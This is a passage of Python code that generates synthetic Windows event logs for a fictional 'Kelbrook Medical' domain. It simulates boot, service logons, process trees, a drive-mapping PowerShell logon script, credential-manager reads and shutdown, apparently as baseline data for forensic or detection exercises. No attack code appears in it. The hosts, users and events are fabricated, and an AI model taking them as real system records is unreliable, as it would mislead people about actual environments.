    ("svc_bfe", "-k LocalServiceNoNetworkFirewall -p", "local"), ("svc_audio", "-k LocalServiceNetworkRestricted -p -s AudioSrv", "local"),
    ("svc_winmgmt", "-k netsvcs -p -s Winmgmt", "system"), ("svc_bits", "-k netsvcs -p -s BITS", "system"),
    ("svc_lanman", "-k NetworkService -p -s LanmanWorkstation", "network"), ("svc_cryptsvc", "-k NetworkService -p -s CryptSvc", "network"),
    ("svc_w32time", "-k LocalService -s W32Time", "local"), ("svc_wuauserv", "-k netsvcs -p -s wuauserv", "system"),
    ("svc_usosvc", "-k netsvcs -p -s UsoSvc", "system"), ("svc_wpnservice", "-k netsvcs -p -s WpnService", "system"),
    ("svc_cdp", "-k LocalService -p -s CDPSvc", "local"), ("svc_sysmain", "-k LocalSystemNetworkRestricted -p -s SysMain", "system"),
    ("svc_appinfo", "-k netsvcs -p -s Appinfo", "system"), ("svc_themes", "-k netsvcs -p -s Themes", "system"),
    ("svc_diagtrack", "-k utcsvc -p", "system"), ("svc_wsearch_none", "-k LocalSystemNetworkRestricted -p -s PcaSvc", "system"),
]
SVCHOST = r"C:\Windows\System32\svchost.exe"
DEF_PLAT = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0"
SERVICES_7036 = ["Servicio de directivas de diagnóstico", "Cliente DHCP", "Cliente DNS", "Hora de Windows",
                 "Servicio de lista de redes", "Estación de trabajo", "Servicio Antivirus de Microsoft Defender",
                 "Programador de tareas", "Instrumental de administración de Windows", "Cola de impresión",
                 "Windows Search", "Servicio de transferencia inteligente en segundo plano (BITS)"]


def win_boot(sim, t, sysmon_active):
    """Arranque en frío. Devuelve el instante en que el escritorio está listo para iniciar sesión."""
    r = sim.rng
    sim.pids, sim.procs, sim.logons = set(), {}, {}
    sim.boot_t, sim.shutdown_t = t, None
    sim.audit_from = t + sec(3.4)
    sim.lsass_pid = r.randrange(780, 920, 4)
    sim.sysmon_from = (t + sec(8.6)) if sysmon_active else None
    sim.sys(t + sec(0.5), "Microsoft-Windows-Kernel-General", 12, [
        ("MajorVersion", S.U32, 10), ("MinorVersion", S.U32, 0), ("BuildVersion", S.U32, 26100),
        ("QfeVersion", S.U32, 6899), ("ServiceVersion", S.U32, 0), ("BootMode", S.U32, 0),
        ("StartTime", S.FT, t)], guid=GUIDS["Microsoft-Windows-Kernel-General"], ver=2, task=1, pid=4,
        kw=0x8000000000000080)
    sim.sys(t + sec(0.6), "Microsoft-Windows-Kernel-Boot", 27, [("BootType", S.U32, 0), ("LoadOptions", S.STR, "")],
            guid=GUIDS["Microsoft-Windows-Kernel-Boot"], ver=0, task=33, pid=4, kw=0x8000000000000000)
    for cpu in range(8):
        sim.sys(t + sec(1.1 + cpu * 0.003), "Microsoft-Windows-Kernel-Processor-Power", 55, [
            ("Group", S.U16, 0), ("Number", S.U32, cpu), ("IdleStateCount", S.U32, 3), ("PerfStateCount", S.U32, 0),
            ("ThrottleStateCount", S.U32, 0), ("ProcessorType", S.STR, "Intel")],
            guid=GUIDS["Microsoft-Windows-Kernel-Processor-Power"], ver=3, task=47, pid=4, kw=0x8000000000000000)
    # Seguridad: inicio y sesiones de servicio
    sim.sec(t + sec(3.5), 4608, 12288, [])
    for ukey, ltype, lproc in (("system", 5, "Advapi  "), ("local", 5, "Advapi  "), ("network", 5, "Advapi  ")):
        sid, name, dom, lid = USERS[ukey]
        sim.sec(t + sec(4.0 + r.random()), 4624, 12544, logon_fields(ukey, ltype, lid, "{00000000-0000-0000-0000-000000000000}",
                                                                  r"C:\Windows\System32\services.exe", 0x2A0 + 4, lproc, "Negotiate"), ver=3)
        if ukey == "system":
            sim.sec(t + sec(4.01), 4672, 12548, special_fields("system"))
    # Cuentas virtuales de la sesión gráfica (DWM y UMFD)
    for k, (ukey, pname) in enumerate((("umfd0", r"C:\Windows\System32\wininit.exe"), ("umfd1", r"C:\Windows\System32\winlogon.exe"),
                                       ("dwm", r"C:\Windows\System32\winlogon.exe"))):
        lid = r.randrange(0x9000, 0x1F000)
        sim.logons[ukey] = Logon(ukey, lid, sim.logon_guid(t, lid))
        sim.sec(t + sec(3.7 + k * 0.5), 4624, 12544, logon_fields(ukey, 2, lid, "{00000000-0000-0000-0000-000000000000}",
                                                                pname, r.randrange(600, 760, 4), "Advapi  ", "Negotiate",
                                                                elevated="%%1842"), ver=3)
    # Procesos de arranque
    P = {}
    def sp(off, key, image, cmd, parent, ukey, integ="System", session=0, life=None):
        par = P.get(parent) if parent else None
        P[key] = sim.spawn(t + sec(off + r.random() * 0.2), image, cmd, par, ukey, integ, session=session, life=life, key=key)
        return P[key]
    sp(0.9, "smss", r"C:\Windows\System32\smss.exe", r"\SystemRoot\System32\smss.exe", None, "system")
    sp(2.0, "csrss0", r"C:\Windows\System32\csrss.exe", r"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16", "smss", "system")
    sp(2.1, "wininit", r"C:\Windows\System32\wininit.exe", "wininit.exe", "smss", "system")
    sp(2.3, "csrss1", r"C:\Windows\System32\csrss.exe", P["csrss0"].cmd, "smss", "system", session=1)
    sp(2.4, "winlogon", r"C:\Windows\System32\winlogon.exe", "winlogon.exe", "smss", "system", session=1)
    sp(3.0, "services", r"C:\Windows\System32\services.exe", r"C:\Windows\system32\services.exe", "wininit", "system")
    P["lsass"] = sim.spawn(t + sec(3.1), r"C:\Windows\System32\lsass.exe", r"C:\Windows\system32\lsass.exe", P["wininit"], "system", "System", session=0, key="lsass")
    P["lsass"].pid = sim.lsass_pid
    sp(3.7, "fontdrv0", r"C:\Windows\System32\fontdrvhost.exe", '"fontdrvhost.exe"', "wininit", "umfd0", "Low")
    sp(3.7, "fontdrv1", r"C:\Windows\System32\fontdrvhost.exe", '"fontdrvhost.exe"', "winlogon", "umfd1", "Low", session=1)
    off = 3.6
    for key, args, ukey in SVCHOSTS:
        sp(off, key, SVCHOST, rf"C:\Windows\system32\svchost.exe {args}", "services", ukey)
        off += 0.08 + r.random() * 0.25
    sp(4.2, "logonui", r"C:\Windows\System32\LogonUI.exe", '"LogonUI.exe" /flags:0x2 /state0:0xa3b92855 /state1:0x41c64e6d', "winlogon", "system", session=1)
    sp(4.3, "dwm", r"C:\Windows\System32\dwm.exe", '"dwm.exe"', "winlogon", "dwm", session=1)
    sp(5.5, "msmpeng", DEF_PLAT + r"\MsMpEng.exe", '"' + DEF_PLAT + r'\MsMpEng.exe"', "services", "system")
    sp(6.0, "spoolsv", r"C:\Windows\System32\spoolsv.exe", r"C:\Windows\System32\spoolsv.exe", "services", "system")
    if sysmon_active:
        sim.sysmon_pid = r.randrange(3000, 3600, 4)
        sp(7.0, "sysmon", r"C:\Windows\Sysmon64.exe", r"C:\Windows\Sysmon64.exe", "services", "system")
        P["sysmon"].pid = sim.sysmon_pid
        sim.sysmon(t + sec(8.7), 4, 3, [("UtcTime", S.STR, iso(t + sec(8.7), 3)), ("State", S.STR, "Started"),
                                        ("Version", S.STR, "15.15"), ("SchemaVersion", S.STR, "4.90")])
    sp(9.2, "nissrv", DEF_PLAT + r"\NisSrv.exe", '"' + DEF_PLAT + r'\NisSrv.exe"', "services", "local")
    sp(9.6, "mpcore", DEF_PLAT + r"\MpDefenderCoreService.exe", '"' + DEF_PLAT + r'\MpDefenderCoreService.exe"', "services", "system")
    sp(10.1, "searchidx", r"C:\Windows\System32\SearchIndexer.exe", r"C:\Windows\system32\SearchIndexer.exe /Embedding", "services", "system")
    sp(10.4, "sechealth", r"C:\Windows\System32\SecurityHealthService.exe", r"C:\Windows\system32\SecurityHealthService.exe", "services", "system")
    sp(10.9, "rtkaud", r"C:\Program Files\Realtek\Audio\HDA\RtkAudUService64.exe", r'"C:\Program Files\Realtek\Audio\HDA\RtkAudUService64.exe"', "services", "system")
    sp(11.3, "c2r", r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe", r'"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe" /service', "services", "system")
    sp(12.5, "wmiprvse", r"C:\Windows\System32\wbem\WmiPrvSE.exe", r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding", "svc_dcom", "network", life=r.randint(30, 600))
    # Sistema: servicios, red, hora, directiva
    sim.sys(t + sec(11.0), "e1dexpress", 32, [(None, S.STR, "\\Device\\NDMP2"), (None, S.STR, "Intel(R) Ethernet Connection (16) I219-LM"),
                                               (None, S.BIN, bytes(16))], esn="e1dexpress", qual=16384, kw=0x80000000000000, pid=4)
    for i, svc in enumerate(SERVICES_7036):
        sim.sys(t + sec(5 + i * 0.7 + r.random()), "Service Control Manager", 7036, [
            ("param1", S.STR, svc), ("param2", S.STR, "en ejecución"),
            ("Binary", S.BIN, svc.encode("utf-16-le")[:24])], guid=GUIDS["Service Control Manager"],
            esn="Service Control Manager", qual=16384, kw=0x8080000000000000, pid=P["services"].pid)
    sim.sys(t + sec(17.2), "EventLog", 6009, [(None, S.STR, "10.00."), (None, S.STR, "26100"), (None, S.STR, ""),
                                              (None, S.STR, "Multiprocessor Free"), (None, S.STR, "0")],
            esn="EventLog", qual=32768, kw=0x80000000000000, pid=0)
    sim.sys(t + sec(17.2), "EventLog", 6005, [], esn="EventLog", qual=32768, kw=0x80000000000000, pid=0)
    sim.sys(t + sec(24.0), "Microsoft-Windows-Time-Service", 37, [("TimeSource", S.STR, "dc01.kelbrook.internal (ntp.d|10.20.30.61:123->10.20.30.3:123)")],
            guid=GUIDS["Microsoft-Windows-Time-Service"], ver=0, task=0, kw=0x8000000000000000)
    sim.sys(t + sec(26.0), "Microsoft-Windows-Time-Service", 35, [("TimeSource", S.STR, "dc01.kelbrook.internal (ntp.d|10.20.30.61:123->10.20.30.3:123)"),
                                                                ("TimeSourceRefId", S.STR, "0x031E140A")],
            guid=GUIDS["Microsoft-Windows-Time-Service"], ver=0, task=0, kw=0x8000000000000000)
    sim.sys(t + sec(41.0 + r.random() * 8), "Microsoft-Windows-GroupPolicy", 1502, [
        ("SupportInfo1", S.U32, 1), ("SupportInfo2", S.U32, 8064), ("ProcessingMode", S.U32, 0),
        ("ProcessingTimeInMilliseconds", S.U32, r.randint(1800, 4200)), ("NumberOfGroupPolicyObjects", S.U32, 4),
        ("IsMachine", S.U32, 1)], guid=GUIDS["Microsoft-Windows-GroupPolicy"], ver=0, task=0,
        kw=0x8000000000000000, user="S-1-5-18")
    sim.sys(t + sec(70), "SecurityCenter", 15, [(None, S.STR, "Windows Defender"), (None, S.STR, "SECURITY_PRODUCT_STATE_ON")],
            ch="Application", esn="SecurityCenter", qual=0, kw=0x80000000000000, pid=0)
    return t + sec(20)


def logon_fields(ukey, ltype, lid, lguid, pname, ppid, lproc="User32 ", auth="Negotiate", ip="-", port="-",
                 elevated="%%1842", linked=0, workstation=HOST):
    sid, name, dom, _ = USERS[ukey]
    if ukey == "system":
        name, dom = "SYSTEM", "NT AUTHORITY"
    return [
        ("SubjectUserSid", S.SID, "S-1-5-18"), ("SubjectUserName", S.STR, HOST + "$"), ("SubjectDomainName", S.STR, DOMAIN),
        ("SubjectLogonId", S.HEX64, 0x3E7), ("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name),
        ("TargetDomainName", S.STR, dom), ("TargetLogonId", S.HEX64, lid), ("LogonType", S.U32, ltype),
        ("LogonProcessName", S.STR, lproc), ("AuthenticationPackageName", S.STR, auth),
        ("WorkstationName", S.STR, workstation if ltype in (2, 7, 11) else "-"), ("LogonGuid", S.GUID, lguid),
        ("TransmittedServices", S.STR, "-"), ("LmPackageName", S.STR, "-"), ("KeyLength", S.U32, 0),
        ("ProcessId", S.HEX64, ppid), ("ProcessName", S.STR, pname), ("IpAddress", S.STR, ip if ltype not in (2, 7, 11) else "127.0.0.1"),
        ("IpPort", S.STR, port if ltype not in (2, 7, 11) else "0"), ("ImpersonationLevel", S.STR, "%%1833"),
        ("RestrictedAdminMode", S.STR, "-"), ("RemoteCredentialGuard", S.STR, "-"), ("TargetOutboundUserName", S.STR, "-"),
        ("TargetOutboundDomainName", S.STR, "-"), ("VirtualAccount", S.STR, "%%1843"), ("TargetLinkedLogonId", S.HEX64, linked),
        ("ElevatedToken", S.STR, elevated)]


PRIVS_SYSTEM = "\t\t\tSeAssignPrimaryTokenPrivilege\r\n\t\t\tSeTcbPrivilege\r\n\t\t\tSeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeAuditPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege"
PRIVS_ADMIN = "SeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege"

def special_fields(ukey, lid=None):
    sid, name, dom, l = USERS[ukey]
    return [("SubjectUserSid", S.SID, sid), ("SubjectUserName", S.STR, name), ("SubjectDomainName", S.STR, dom),
            ("SubjectLogonId", S.HEX64, l if lid is None else lid),
            ("PrivilegeList", S.STR, PRIVS_SYSTEM.strip() if ukey == "system" else PRIVS_ADMIN)]


GPO_SCRIPT = r"\\kelbrook.internal\SysVol\kelbrook.internal\Policies\{A3E1F5C2-7B4D-4E8A-9C21-5D6F0B3A8E17}\User\Scripts\Logon\mapear_unidades.ps1"
LOGON_PS = (r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy ByPass '
            r'-NonInteractive -WindowStyle Hidden -File "' + GPO_SCRIPT + '"')
LOGON_SCRIPT_TEXT = """# Mapeo de unidades de red - Kelbrook Medical (GPO "Usuarios - Administracion")
# Mantenimiento: IT (jtorres). No editar desde el puesto.
$ErrorActionPreference = 'SilentlyContinue'
$grupos = ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups |
    ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value }

if ($grupos -contains 'KELBROOK\\GG_Facturacion') {
    New-PSDrive -Name F -PSProvider FileSystem -Root '\\\\fs01\\Facturacion' -Persist -Scope Global | Out-Null
}
New-PSDrive -Name H -PSProvider FileSystem -Root "\\\\fs01\\Usuarios$\\$env:USERNAME" -Persist -Scope Global | Out-Null
"""
PS_VER = "5.1.26100.6899"


def ps_engine_events(sim, t, t_end, host_app, user_sid, script_text, script_path, seq0):
    """Eventos clásicos (400/600/403) y operacionales (40961/40962/53504/4104) de una sesión de PowerShell."""
    r = sim.rng
    host_id, runspace = str(uuid.UUID(int=r.getrandbits(128))), str(uuid.UUID(int=r.getrandbits(128)))
    act = "{" + str(uuid.UUID(int=r.getrandbits(128))).upper() + "}"
    def detail(extra, seq):
        return (f"\t{extra}\r\n\r\n\tSequenceNumber={seq}\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion={PS_VER}\r\n"
                f"\tHostId={host_id}\r\n\tHostApplication={host_app}\r\n\tEngineVersion={PS_VER}\r\n\tRunspaceId={runspace}\r\n"
                f"\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=")
    pid = sim.procs["_ps"].pid
    sim.sys(t + sec(0.05), "Microsoft-Windows-PowerShell", 40961, [], ch="PSOp", guid=GUIDS["Microsoft-Windows-PowerShell"],
            ver=1, task=4, opcode=1, kw=0x0, pid=pid, user=user_sid, activity=act)
    for i, prov in enumerate(("Registry", "Alias", "Environment", "FileSystem", "Function", "Variable")):
        sim.sys(t + sec(0.30 + i * 0.002), "PowerShell", 600, [
            (None, S.STR, prov), (None, S.STR, "Started"),
            (None, S.STR, detail(f"ProviderName={prov}\r\n\tNewProviderState=Started", seq0 + i))],
            ch="PS", esn="PowerShell", qual=0, task=6, kw=0x80000000000000, pid=0)
    sim.sys(t + sec(0.33), "PowerShell", 400, [
        (None, S.STR, "Available"), (None, S.STR, "None"),
        (None, S.STR, detail("NewEngineState=Available\r\n\tPreviousEngineState=None", seq0 + 6))],
        ch="PS", esn="PowerShell", qual=0, task=4, kw=0x80000000000000, pid=0)
    sim.sys(t + sec(0.36), "Microsoft-Windows-PowerShell", 53504, [("param1", S.STR, str(pid)), ("param2", S.STR, "DefaultAppDomain")],
            ch="PSOp", guid=GUIDS["Microsoft-Windows-PowerShell"], ver=1, task=111, opcode=10, kw=0x0, pid=pid,
            user=user_sid, activity=act)
    sim.sys(t + sec(0.41), "Microsoft-Windows-PowerShell", 40962, [], ch="PSOp", guid=GUIDS["Microsoft-Windows-PowerShell"],
            ver=1, task=4, opcode=2, kw=0x0, pid=pid, user=user_sid, activity=act)
    sbid = str(uuid.UUID(int=r.getrandbits(128)))
    sim.sys(t + sec(0.52), "Microsoft-Windows-PowerShell", 4104, [
        ("MessageNumber", S.U32, 1), ("MessageTotal", S.U32, 1), ("ScriptBlockText", S.STR, script_text),
        ("ScriptBlockId", S.STR, sbid), ("Path", S.STR, script_path)], ch="PSOp", guid=GUIDS["Microsoft-Windows-PowerShell"],
        ver=1, level=5, task=2, opcode=15, kw=0x0, pid=pid, user=user_sid, activity=act)
    sim.sys(t_end, "PowerShell", 403, [
        (None, S.STR, "Stopped"), (None, S.STR, "Available"),
        (None, S.STR, detail("NewEngineState=Stopped\r\n\tPreviousEngineState=Available", seq0 + 7))],
        ch="PS", esn="PowerShell", qual=0, task=4, kw=0x80000000000000, pid=0)
    return seq0 + 8


def user_logon(sim, t, ukey="lmarin"):
    r = sim.rng
    sid = USERS[ukey][0]
    P = sim.procs
    lid = r.randrange(0x200000, 0x4FFFFF)
    lguid = "{" + str(uuid.UUID(int=r.getrandbits(128))) + "}"
    sim.logons[ukey] = Logon(ukey, lid, sim.logon_guid(t, lid))
    if ukey == "jtorres":
        lid2 = lid + r.randint(40, 90)
        sim.sec(t, 4624, 12544, logon_fields(ukey, 2, lid, lguid, r"C:\Windows\System32\svchost.exe", P["svc_lsm"].pid,
                                              elevated="%%1842", linked=lid2), ver=3)
        sim.sec(t + 1, 4672, 12548, special_fields(ukey, lid))
        sim.sec(t + 2, 4624, 12544, logon_fields(ukey, 2, lid2, lguid, r"C:\Windows\System32\svchost.exe", P["svc_lsm"].pid,
                                                  elevated="%%1843", linked=lid), ver=3)
        sim.logons[ukey] = Logon(ukey, lid2, sim.logon_guid(t, lid2))
        sim.logons["jtorres_elev"] = Logon(ukey, lid, sim.logon_guid(t, lid))
    else:
        sim.sec(t, 4624, 12544, logon_fields(ukey, 2, lid, lguid, r"C:\Windows\System32\svchost.exe", P["svc_lsm"].pid,
                                              elevated="%%1843"), ver=3)
    session = 1 if ukey == "lmarin" else 2
    sim.sys(t + sec(1.2), "Microsoft-Windows-Winlogon", 7001, [("TSId", S.U32, session), ("UserSid", S.SID, sid)],
            guid=GUIDS["Microsoft-Windows-Winlogon"], ver=0, task=1101, kw=0x2000200000000000, user="S-1-5-18")
    home = rf"C:\Users\{USERS[ukey][1]}"
    def sp(off, key, image, cmd, parent, life=None, integ="Medium", rule="-"):
        par = P.get(parent) if isinstance(parent, str) else parent
        p = sim.spawn(t + sec(off + r.random() * 0.3), image, cmd, par, ukey, integ, session=session, life=life,
                      key=key + ("" if ukey == "lmarin" else "_j"), rule=rule)
        return p
    sp(0.4, "userinit", r"C:\Windows\System32\userinit.exe", r"C:\Windows\system32\userinit.exe", "winlogon", life=28)
    sp(0.6, "sihost", r"C:\Windows\System32\sihost.exe", "sihost.exe", "svc_dcom")
    sp(0.7, "taskhostw", r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}", "svc_netsvcs")
    sp(0.9, "explorer", r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", P.get("userinit" if ukey == "lmarin" else "userinit_j"))
    sp(1.6, "ctfmon", r"C:\Windows\System32\ctfmon.exe", '"ctfmon.exe"', "svc_dcom")
    sp(2.4, "startmenu", r"C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe",
       r'"C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca', "svc_dcom")
    sp(2.6, "rtbroker", r"C:\Windows\System32\RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe -Embedding", "svc_dcom")
    sp(2.9, "searchhost", r"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe",
       r'"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca', "svc_dcom")
    sp(3.4, "textinput", r"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe",
       r'"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca', "svc_dcom")
    sp(5.1, "systray", r"C:\Windows\System32\SecurityHealthSystray.exe", r'"C:\Windows\System32\SecurityHealthSystray.exe"', P.get("explorer" + ("" if ukey == "lmarin" else "_j")), integ="Medium")
    if ukey == "lmarin":
        od = sp(6.0, "onedrive", IMG_ONEDRIVE, f'"{IMG_ONEDRIVE}" /background', "explorer")
        sim.regset(t + sec(7.4), od, rf"HKU\{sid}\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDrive",
                   f'"{IMG_ONEDRIVE}" /background', rule="technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder")
        e = sp(6.3, "msedge", EDGE, f'"{EDGE}" --no-startup-window --win-session-start', "explorer")
        for k in range(4):
            sp(6.6 + k * 0.1, f"edgech{k}", EDGE, f'"{EDGE}" --type={("crashpad-handler", "gpu-process", "utility", "utility")[k]} --field-trial-handle=1980,i,{r.getrandbits(60)},{r.getrandbits(60)},262144 --mojo-platform-channel-handle={2100 + k * 64} /prefetch:{(1, 2, 3, 8)[k]}', e,
               integ="Medium" if k != 1 else "Low")
        tm = sp(8.2, "teams", TEAMS, f'"{TEAMS}" msteams:system-initiated', "explorer")
        for k in range(3):
            sp(9.0 + k * 0.4, f"teamswv{k}", WEBVIEW, f'"{WEBVIEW}" --embedded-browser-webview=1 --webview-exe-name=ms-teams.exe --type={("crashpad-handler", "gpu-process", "renderer")[k]} /prefetch:{(1, 2, 1)[k]}', tm,
               integ="Medium" if k == 0 else "Low")
        # Script de inicio de sesión de la GPO
        gp = sp(21.0, "gpscript", r"C:\Windows\System32\gpscript.exe", "gpscript.exe /Logon", "svc_gpsvc", life=4.5)
        ps = sp(21.6, "_ps", POWERSHELL, LOGON_PS, gp, life=2.6)
        sp(21.7, "_conhost", r"C:\Windows\System32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1", ps, life=2.5)
        sim.ps_seq = ps_engine_events(sim, ps.start, ps.end, LOGON_PS, sid, LOGON_SCRIPT_TEXT, GPO_SCRIPT, getattr(sim, "ps_seq", 1))
        sim.sys(t + sec(26.5), "Microsoft-Windows-GroupPolicy", 1503, [
            ("SupportInfo1", S.U32, 1), ("SupportInfo2", S.U32, 8065), ("ProcessingMode", S.U32, 0),
            ("ProcessingTimeInMilliseconds", S.U32, r.randint(2400, 6100)), ("NumberOfGroupPolicyObjects", S.U32, 3),
            ("IsMachine", S.U32, 0)], guid=GUIDS["Microsoft-Windows-GroupPolicy"], ver=0, task=0,
            kw=0x8000000000000000, user=sid)
        for k in range(r.randint(2, 4)):
            sim.sec(t + sec(9 + k * 3.3), 5379, 13824, [
                ("SubjectUserSid", S.SID, sid), ("SubjectUserName", S.STR, "lmarin"), ("SubjectDomainName", S.STR, DOMAIN),
                ("SubjectLogonId", S.HEX64, lid), ("TargetName", S.STR, ("MicrosoftAccount:target=SSO_POP_Device",
                 "WindowsLive:target=virtualapp/didlogical", "OneDrive Cached Credential Business - Business1",
                 "MicrosoftOffice16_Data:SSPI:lmarin@kelbrook-medical.net")[k]), ("Type", S.U32, 1 if k != 2 else 2),
                ("CountOfCredentialsReturned", S.U32, 0 if k == 0 else 1), ("ReadOperation", S.STR, "%%8100"),
                ("ReturnCode", S.U32, 0 if k else 0x80070490), ("ProcessCreationTime", S.STR, iso(t, 7).replace(" ", "T") + "Z"),
                ("ClientProcessId", S.U32, P["lsass"].pid)])
    return lid


IMG_ONEDRIVE = r"C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
IMG_ODUPDATER = r"C:\Users\lmarin\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"
EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
TEAMS = r"C:\Program Files\WindowsApps\MSTeams_25255.703.3981.7231_x64__8wekyb3d8bbwe\ms-teams.exe"
WEBVIEW = r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\141.0.3537.71\msedgewebview2.exe"
OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"


def lock_unlock(sim, t_lock, t_unlock, ukey="lmarin"):
    sid, name, dom, _ = USERS[ukey]
    lid = sim.logons[ukey].id
    base = [("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name), ("TargetDomainName", S.STR, dom),
            ("TargetLogonId", S.HEX64, lid), ("SessionId", S.U32, 1)]
    sim.sec(t_lock, 4800, 12551, base)
    nl = lid + sim.rng.randint(0x1000, 0x9000)
    sim.sec(t_unlock, 4624, 12544, logon_fields(ukey, 7, nl, "{" + str(uuid.UUID(int=sim.rng.getrandbits(128))) + "}",
                                                r"C:\Windows\System32\svchost.exe", sim.procs["svc_lsm"].pid,
                                                elevated="%%1843", linked=0), ver=3)
    sim.sec(t_unlock + sec(0.2), 4801, 12551, base)
    sim.sec(t_unlock + sec(sim.rng.uniform(3, 9)), 4634, 12545, [
        ("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name), ("TargetDomainName", S.STR, dom),
        ("TargetLogonId", S.HEX64, nl), ("LogonType", S.U32, 7)])


def win_shutdown(sim, t, ukey="lmarin", by_update=False):
    r = sim.rng
    sid, name, dom, _ = USERS[ukey]
    lid = sim.logons[ukey].id if ukey in sim.logons else 0
    expl = sim.procs.get("explorer")
    if by_update:
        sim.sys(t, "User32", 1074, [
            ("param1", S.STR, r"C:\Windows\system32\MoUsoCoreWorker.exe (KB-FIN-WS03)"), ("param2", S.STR, HOST),
            ("param3", S.STR, "Sistema operativo: Service Pack (planeado)"), ("param4", S.STR, "0x80020010"),
            ("param5", S.STR, "reiniciar"), ("param6", S.STR, ""), ("param7", S.STR, "NT AUTHORITY\\SYSTEM")],
            guid=GUIDS["User32"], esn="User32", qual=32768, kw=0x8080000000000000)
    else:
        sim.sys(t, "User32", 1074, [
            ("param1", S.STR, r"C:\Windows\Explorer.EXE (KB-FIN-WS03)"), ("param2", S.STR, HOST),
            ("param3", S.STR, "Otro (no planeado)"), ("param4", S.STR, "0x0"), ("param5", S.STR, "apagar"),
            ("param6", S.STR, ""), ("param7", S.STR, f"{DOMAIN}\\{name}")],
            guid=GUIDS["User32"], esn="User32", qual=32768, kw=0x8080000000000000)
    for key in ("outlook", "teams", "onedrive", "msedge", "explorer", "excel"):
        p = sim.procs.get(key)
        if p and (p.end is None or p.end > t):
            sim.exit(p, t + sec(r.uniform(0.5, 2.5)))
    if lid:
        sim.sec(t + sec(1.1), 4647, 12545, [("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name),
                                             ("TargetDomainName", S.STR, dom), ("TargetLogonId", S.HEX64, lid)])
        sim.sys(t + sec(2.0), "Microsoft-Windows-Winlogon", 7002, [("TSId", S.U32, 1), ("UserSid", S.SID, sid)],
                guid=GUIDS["Microsoft-Windows-Winlogon"], ver=0, task=1102, kw=0x2000200000000000, user="S-1-5-18")
        sim.sec(t + sec(3.4), 4634, 12545, [("TargetUserSid", S.SID, sid), ("TargetUserName", S.STR, name),
                                             ("TargetDomainName", S.STR, dom), ("TargetLogonId", S.HEX64, lid),
                                             ("LogonType", S.U32, 2)])
    sim.sys(t + sec(5.2), "Microsoft-Windows-Security-SPP", 16384, [
        (None, S.STR, iso(t + sec(86400 * 1.0), 3).replace(" ", "T") + "Z"), (None, S.STR, "RulesEngine")],
        ch="Application", guid=GUIDS["Microsoft-Windows-Security-SPP"], esn="Software Protection Platform Service",
        qual=16384, kw=0x80000000000000, pid=0)
    sim.sys(t + sec(9.0), "Microsoft-Windows-Kernel-Power", 109, [
        ("ShutdownActionType", S.U32, 5 if not by_update else 6), ("ShutdownEventCode", S.U32, 0), ("ShutdownReason", S.U32, 0)],
        guid=GUIDS["Microsoft-Windows-Kernel-Power"], ver=0, task=0, kw=0x8000000000000404, pid=4)
